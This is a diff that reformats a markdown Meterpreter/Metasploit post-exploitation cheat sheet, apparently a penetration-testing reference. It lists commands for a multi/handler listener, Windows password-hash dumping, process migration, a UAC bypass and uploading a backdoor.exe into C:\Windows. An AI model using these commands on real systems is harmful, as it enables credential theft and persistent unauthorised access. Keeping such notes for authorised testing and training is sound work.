@@ -3,34 +3,37 @@
 https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
 
 
-#### Multi handler:
+## Multi handler:
+
 ```
 use exploit/multi/handler
 ```
 
+## Reopen session:
 
-#### Reopen session:
 ```
 session -i #
 ```
 
+## Get hashes:
 
-#### Get hashes:
 ```
 run post/windows/gather/hashdump
 ```
 
+## migrate:
 
-#### migrate:
 ```
 run post/windows/manage/migrate
 ```
+
 or
+
 ```
 use post/windows/manage/archmigrate
 ```
 
-#### Bypass UAC:
+## Bypass UAC:
 
 Use with an already achieved meterpreter shell:
 
@@ -40,7 +43,7 @@ Use with an already achieved meterpreter shell:
 
 This can be used to enable the `getsystem` command to work (potentially).
 
-#### Upload and download files:
+## Upload and download files:
 
 `meterpreter > download Logs.log /root/`
 `meterpreter > upload /root/backdoor.exe C:\\Windows`
